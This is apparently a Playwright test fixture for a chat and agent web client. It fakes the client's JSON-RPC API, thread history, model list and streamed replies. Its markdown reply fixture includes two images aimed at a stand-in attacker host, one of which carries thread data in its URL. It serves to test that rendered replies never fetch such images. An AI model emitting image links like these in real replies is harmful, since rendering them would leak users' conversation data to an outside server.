import type { ModelInfo, RawEvent, Space, TaskInfo, ThreadSummary } from '@glave/client';
import type { Page, Route } from '@playwright/test';

/**
 * What the fake server knows: a project and the person's own space with their threads, one
 * thread's history (a command, an edit and a new file, a reply from the default model, which
 * the picker shows), the models, the tasks, and what a turn streams.
 */
const OWNER = { kind: 'person', id: '01900000-0000-7000-8000-0000000000aa' } as const;

function space(id: string, name: string, kind: Space['kind']): Space {
  return {
    id,
    kind,
    name,
    owner: OWNER,
    members: [],
    created_at: '2026-10-11T10:00:00.000Z',
    updated_at: '2026-10-11T10:00:00.000Z',
  };
}

const PROJECT = space('01900000-0000-7000-8000-000000000001', 'glave', 'project');
const PERSONAL = space('01900000-0000-7000-8000-000000000002', 'Personal', 'personal');

const TOKENS = { input: 1200, output: 300, cache_read: 0, cache_write: 0, reasoning: 0 };

function thread(
  id: string,
  title: string,
  status: ThreadSummary['status'] = 'idle',
  inSpace = PROJECT,
): ThreadSummary {
  return {
    id,
    space: inSpace.id,
    status,
    standing: 'active',
    title,
    approval: 'auto',
    origin: { kind: 'web' },
    created_at: '2026-10-11T10:00:00.000Z',
    updated_at: '2026-10-11T10:05:00.000Z',
    turns: 1,
    tokens: TOKENS,
  };
}

export const THREAD = '01900000-0000-7000-8000-000000000101';
export const NEW_THREAD = '01900000-0000-7000-8000-000000000102';

const THREADS: Readonly<Record<string, readonly ThreadSummary[]>> = {
  [PROJECT.id]: [
    thread(THREAD, 'Make the tests pass'),
    thread('01900000-0000-7000-8000-000000000103', 'Review the release notes', 'waiting'),
    thread('01900000-0000-7000-8000-000000000104', 'Nightly dependency audit', 'running'),
  ],
  [PERSONAL.id]: [
    thread('01900000-0000-7000-8000-000000000105', 'Dinner ideas for Saturday', 'idle', PERSONAL),
  ],
};

/** The default model: no name configured, so the app names it from its id. */
const DEFAULT_MODEL = 'anthropic/claude-haiku-5.5';

/**
 * The models the fake server runs: its default, Hope, two more, and a long catalogue like
 * OpenRouter's, which the picker must search and scroll.
 */
export const MODELS: readonly ModelInfo[] = [
  { id: DEFAULT_MODEL, default: true, hope: false },
  { id: 'hope-12b', name: 'Hope', default: false, hope: true },
  { id: 'openai/gpt-6-luna', default: false, hope: false },
  { id: 'deepseek/deepseek-v4.1-flash', default: false, hope: false },
  ...Array.from({ length: 200 }, (_, index) => ({
    id: `lab-${String(index % 20)}/model-${String(index)}`,
    default: false,
    hope: false,
  })),
];

function event(seq: number, type: string, data: RawEvent['data'], id = THREAD): RawEvent {
  return {
    glave: 1,
    id: `01900000-0000-7000-8000-${String(seq).padStart(12, '0')}`,
    thread: id,
    seq,
    at: '2026-10-11T10:00:00.000Z',
    type,
    v: 1,
    data,
  };
}

function call(seq: number, callId: string, tool: string, json: Record<string, unknown>): RawEvent {
  return event(seq, 'tool.call.requested', { call_id: callId, tool, arguments: { json } });
}

function done(seq: number, callId: string, text: string): RawEvent {
  return event(seq, 'tool.call.completed', {
    call_id: callId,
    is_error: false,
    output: [{ type: 'text', text }],
  });
}

const HISTORY = [
  event(1, 'thread.started', {}),
  event(2, 'message.added', {
    role: 'user',
    parts: [{ type: 'text', text: 'Make the tests pass' }],
  }),
  event(3, 'turn.started', { model: { provider: 'e2e', name: DEFAULT_MODEL } }),
  call(4, 'call_1', 'bash', { command: 'cargo test' }),
  done(5, 'call_1', 'test parse::empty ... FAILED'),
  call(6, 'call_2', 'edit', {
    path: 'src/parse.rs',
    old_string: 'fn parse(input: &str) -> Value {\n    input.parse().unwrap()\n}',
    new_string:
      'fn parse(input: &str) -> Option<Value> {\n    if input.is_empty() {\n        return None;\n    }\n    input.parse().ok()\n}',
  }),
  done(7, 'call_2', 'Edited src/parse.rs'),
  call(8, 'call_3', 'write', {
    path: 'tests/empty.rs',
    content: '#[test]\nfn empty_input_is_none() {\n    assert_eq!(parse(""), None);\n}\n',
  }),
  done(9, 'call_3', 'Wrote tests/empty.rs'),
  call(10, 'call_4', 'bash', { command: 'cargo test' }),
  done(11, 'call_4', 'test result: ok. 12 passed'),
  event(12, 'message.added', {
    role: 'assistant',
    parts: [
      {
        type: 'text',
        text: 'They pass now. parse() returned a value for empty input and unwrapped a failed parse; it now returns None for both, and a new test covers the empty case.',
      },
    ],
  }),
  event(13, 'model.responded', {
    model: { provider: 'e2e', name: DEFAULT_MODEL },
    stop: 'end_turn',
  }),
];

const TASKS: readonly TaskInfo[] = [
  {
    thread: '01900000-0000-7000-8000-000000000104',
    kind: 'agent',
    title: 'Nightly dependency audit',
    model: 'hope-12b',
    tokens: { ...TOKENS, input: 48200, output: 3100 },
    cost: { micros: 21500, currency: 'USD' },
    started_at: '2026-10-11T10:00:00.000Z',
    elapsed_ms: 754_000,
    status: 'running',
  },
  {
    thread: '01900000-0000-7000-8000-000000000106',
    kind: 'agent',
    title: 'Summarize open issues',
    model: DEFAULT_MODEL,
    tokens: TOKENS,
    cost: { micros: 4200, currency: 'USD' },
    started_at: '2026-10-11T09:00:00.000Z',
    elapsed_ms: 125_000,
    status: 'finished',
    outcome: 'completed',
  },
];

/** A request the fake answered: its method and params. */
export interface Request {
  readonly method: string;
  readonly params: Record<string, unknown>;
}

/** A JSON-RPC message the fake sends. */
type Note = Readonly<Record<string, unknown>>;

/**
 * What a turn streams: the person's message, the reply growing piece by piece, then the reply
 * itself and the turn's result (answering call `id`).
 */
function turnNotes(
  target: string,
  prompt: string,
  pieces: readonly string[],
  id: number,
): readonly Note[] {
  const after = target === THREAD ? HISTORY.length : 0;
  const added = (seq: number, role: string, text: string): Note => ({
    jsonrpc: '2.0',
    method: 'thread/event',
    params: {
      thread: target,
      event: event(seq, 'message.added', { role, parts: [{ type: 'text', text }] }, target),
    },
  });
  return [
    added(after + 1, 'user', prompt),
    ...pieces.map((text) => ({
      jsonrpc: '2.0',
      method: 'turn/live',
      params: { thread: target, update: { kind: 'text', text } },
    })),
    added(after + 2, 'assistant', pieces.join('')),
    {
      jsonrpc: '2.0',
      id,
      result: { turn: { outcome: 'completed', model_calls: 1, tool_calls: 0, tokens: TOKENS } },
    },
  ];
}

function turn(message: { id: number; params: Record<string, unknown> }): string {
  const notes = turnNotes(
    String(message.params['thread']),
    String(message.params['prompt']),
    ['Glad to ', 'help.'],
    message.id,
  );
  return notes.map((note) => `data: ${JSON.stringify(note)}\n\n`).join('');
}

/** What the person asks for a reply in markdown (`streamReply`). */
export const MARKDOWN_PROMPT = 'What changed?';

/**
 * A reply in markdown as a model writes it: a heading, a table, a task list, code, a link, and
 * two images that must never be fetched, one written in markdown and one in raw HTML.
 */
export const MARKDOWN_REPLY = [
  '## The parser is fixed',
  '',
  '`parse()` returned a value for **empty input** and unwrapped a failed parse; it now returns ' +
    '`None` for both. See [the issue](https://github.com/seashell86/glave/issues/226).',
  '',
  '| Input | Before | After |',
  '| :---- | :----: | ----: |',
  '| `""` | panic | `None` |',
  '| `"12"` | `12` | `Some(12)` |',
  '',
  '- [x] Return `None` for empty input',
  '- [ ] Document the change',
  '',
  '```rust',
  'fn parse(input: &str) -> Option<Value> {',
  '    if input.is_empty() {',
  '        return None;',
  '    }',
  '    input.parse().ok()',
  '}',
  '```',
  '',
  '![Coverage by file](https://evil.example/chart.png?thread=make-the-tests-pass)',
  '',
  '<img src="https://evil.example/pixel.png">',
].join('\n');

/**
 * Makes the page's next turn stream `reply` to `THREAD` a few characters at a time, as a model
 * would: the page's own `fetch` answers `turn/start` with a stream that sends each piece on its
 * own, `delay` milliseconds apart, so the page renders the reply as it grows.
 */
export async function streamReply(page: Page, reply = MARKDOWN_REPLY, delay = 15): Promise<void> {
  const pieces = reply.match(/[\s\S]{1,6}/gu) ?? [];
  const notes = turnNotes(THREAD, MARKDOWN_PROMPT, pieces, 0);
  await page.addInitScript(
    ({ notes, delay }) => {
      const real = window.fetch.bind(window);
      window.fetch = async (input, init) => {
        const body = typeof init?.body === 'string' ? init.body : '';
        if (!body.includes('"turn/start"')) {
          return real(input, init);
        }
        const { id } = JSON.parse(body) as { id: number };
        const encoder = new TextEncoder();
        const stream = new ReadableStream<Uint8Array>({
          async start(controller) {
            for (const note of notes) {
              const message = 'result' in note ? { ...note, id } : note;
              controller.enqueue(encoder.encode(`data: ${JSON.stringify(message)}\n\n`));
              await new Promise((resolve) => setTimeout(resolve, delay));
            }
            controller.close();
          },
        });
        return new Response(stream, { headers: { 'Content-Type': 'text/event-stream' } });
      };
    },
    { notes, delay },
  );
}

/** The answer to a call that is not a turn. */
function answer(method: string, params: Record<string, unknown>): unknown {
  switch (method) {
    case 'space/list':
      return { spaces: [PROJECT, PERSONAL] };
    case 'thread/list':
      return { threads: THREADS[String(params['space'])] ?? [] };
    case 'thread/get':
      return { thread: thread(String(params['thread']), 'Make the tests pass') };
    case 'thread/events':
      return { events: params['thread'] === THREAD ? HISTORY : [] };
    case 'thread/start':
      return { thread: thread(NEW_THREAD, '') };
    case 'thread/rename':
      return { thread: thread(String(params['thread']), String(params['title'])) };
    case 'model/list':
      return { models: MODELS };
    case 'tasks/list':
      return { tasks: TASKS };
    case 'memory/list':
      return { memories: [] };
    case 'provider/list':
      return {
        providers: [
          {
            id: '01900000-0000-7000-8000-000000000301',
            kind: 'openrouter',
            hint: 'a1b2',
            models: [],
          },
        ],
      };
    case 'server/discover':
      return {
        name: 'glave',
        version: '0.0.0',
        protocols: ['2026-10'],
        approval: 'auto',
        approvals: ['ask', 'auto'],
      };
    default:
      return {};
  }
}

/** Answers the session API's calls the app makes, as JSON-RPC over POST /. */
export async function fakeApi(
  page: Page,
): Promise<{ readonly calls: readonly string[]; readonly requests: readonly Request[] }> {
  const calls: string[] = [];
  const requests: Request[] = [];
  await page.route('**/*', async (route: Route) => {
    const request = route.request();
    if (request.method() !== 'POST') {
      await route.fallback();
      return;
    }
    const message = request.postDataJSON() as {
      id: number;
      method: string;
      params: Record<string, unknown>;
    };
    calls.push(message.method);
    requests.push({ method: message.method, params: message.params });
    if (message.method === 'turn/start') {
      await route.fulfill({ contentType: 'text/event-stream', body: turn(message) });
      return;
    }
    await route.fulfill({
      contentType: 'application/json',
      body: JSON.stringify({
        jsonrpc: '2.0',
        id: message.id,
        result: answer(message.method, message.params),
      }),
    });
  });
  return { calls, requests };
}
